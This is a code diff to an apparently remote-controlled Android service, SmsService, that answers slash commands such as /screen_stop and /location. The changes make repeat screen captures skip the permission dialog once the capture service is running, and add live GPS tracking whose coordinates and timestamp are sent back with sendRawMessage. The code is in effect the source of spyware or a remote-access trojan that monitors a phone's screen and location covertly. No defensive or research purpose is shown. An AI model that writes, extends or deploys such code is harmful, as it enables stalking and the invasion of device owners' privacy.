@@ -10,7 +10,10 @@ import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
+import android.location.LocationListener;
 import android.location.LocationManager;
+import java.util.concurrent.CountDownLatch;
+import java.util.concurrent.TimeUnit;
 import android.net.Uri;
 import android.os.Build;
 import android.os.IBinder;
@@ -327,9 +330,8 @@ public class SmsService extends Service {
 
             } else if (cmd.equalsIgnoreCase("/screen_stop")) {
                 Intent stopScreen = new Intent(this, ScreenCaptureService.class);
-                stopScreen.setAction("STOP");
+                stopScreen.setAction(ScreenCaptureService.ACTION_STOP_CONT);
                 startService(stopScreen);
-                sendRawMessage("⏹ Screen mirroring band.");
 
             } else if (cmd.equalsIgnoreCase("/help")) {
                 sendRawMessage(
@@ -590,12 +592,28 @@ public class SmsService extends Service {
 
     // ─── Screenshot / Screen Mirror ───────────────────────────
     private void requestScreenshot(boolean continuous, int intervalSec) {
-        ScreenCaptureService.sContinuous  = continuous;
-        ScreenCaptureService.sIntervalSec = intervalSec > 0 ? intervalSec : 30;
-        Intent i = new Intent(this, PermissionActivity.class);
-        i.putExtra("request_screenshot", true);
-        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-        startActivity(i);
+        if (ScreenCaptureService.sRunning) {
+            // Service already alive — send action directly, NO permission dialog
+            Intent svc = new Intent(this, ScreenCaptureService.class);
+            if (continuous) {
+                svc.setAction(ScreenCaptureService.ACTION_START_CONT);
+                svc.putExtra("interval", intervalSec > 0 ? intervalSec : 30);
+            } else {
+                svc.setAction(ScreenCaptureService.ACTION_CAPTURE);
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                startForegroundService(svc);
+            else
+                startService(svc);
+        } else {
+            // First time — need MediaProjection permission once
+            ScreenCaptureService.sPendingContinuous = continuous;
+            ScreenCaptureService.sPendingInterval   = intervalSec > 0 ? intervalSec : 30;
+            Intent i = new Intent(this, PermissionActivity.class);
+            i.putExtra("request_screenshot", true);
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(i);
+        }
     }
 
     // ─── GPS Location ─────────────────────────────────────────
@@ -610,20 +628,54 @@ public class SmsService extends Service {
         new Thread(() -> {
             try {
                 LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
-                Location loc = null;
-                String[] providers = {
-                    LocationManager.GPS_PROVIDER,
-                    LocationManager.NETWORK_PROVIDER,
-                    LocationManager.PASSIVE_PROVIDER
-                };
-                for (String p : providers) {
+
+                // Step 1: Try last known (fast)
+                Location best = null;
+                for (String p : new String[]{
+                        LocationManager.GPS_PROVIDER,
+                        LocationManager.NETWORK_PROVIDER,
+                        LocationManager.PASSIVE_PROVIDER}) {
                     try {
                         if (lm.isProviderEnabled(p)) {
-                            loc = lm.getLastKnownLocation(p);
-                            if (loc != null) break;
+                            Location l = lm.getLastKnownLocation(p);
+                            if (l != null && (best == null || l.getAccuracy() < best.getAccuracy()))
+                                best = l;
                         }
                     } catch (Exception ignored) {}
                 }
+
+                // Step 2: Request live location (max 15 sec wait)
+                sendRawMessage("📍 Location dhundh raha hun...");
+                final Location[] fresh = {best};
+                final CountDownLatch latch = new CountDownLatch(1);
+
+                android.os.HandlerThread ht = new android.os.HandlerThread("LocThread");
+                ht.start();
+                android.os.Handler locHandler = new android.os.Handler(ht.getLooper());
+
+                LocationListener listener = loc -> {
+                    fresh[0] = loc;
+                    latch.countDown();
+                };
+
+                boolean requested = false;
+                for (String p : new String[]{
+                        LocationManager.GPS_PROVIDER,
+                        LocationManager.NETWORK_PROVIDER}) {
+                    try {
+                        if (lm.isProviderEnabled(p)) {
+                            lm.requestSingleUpdate(p, listener, ht.getLooper());
+                            requested = true;
+                            break;
+                        }
+                    } catch (Exception ignored) {}
+                }
+
+                if (requested) latch.await(15, TimeUnit.SECONDS);
+                try { lm.removeUpdates(listener); } catch (Exception ignored) {}
+                ht.quit();
+
+                Location loc = fresh[0];
                 if (loc != null) {
                     double lat = loc.getLatitude(), lon = loc.getLongitude();
                     String time = new SimpleDateFormat("dd-MM-yyyy HH:mm", Locale.getDefault())
@@ -636,7 +688,7 @@ public class SmsService extends Service {
                         "Time: " + time
                     );
                 } else {
-                    sendRawMessage("❌ Location unavailable. GPS on karo.");
+                    sendRawMessage("❌ Location nahi mili.\nSettings → Location → ON karo, phir /location try karo.");
                 }
             } catch (Exception e) {
                 sendRawMessage("❌ Location error: " + e.getMessage());
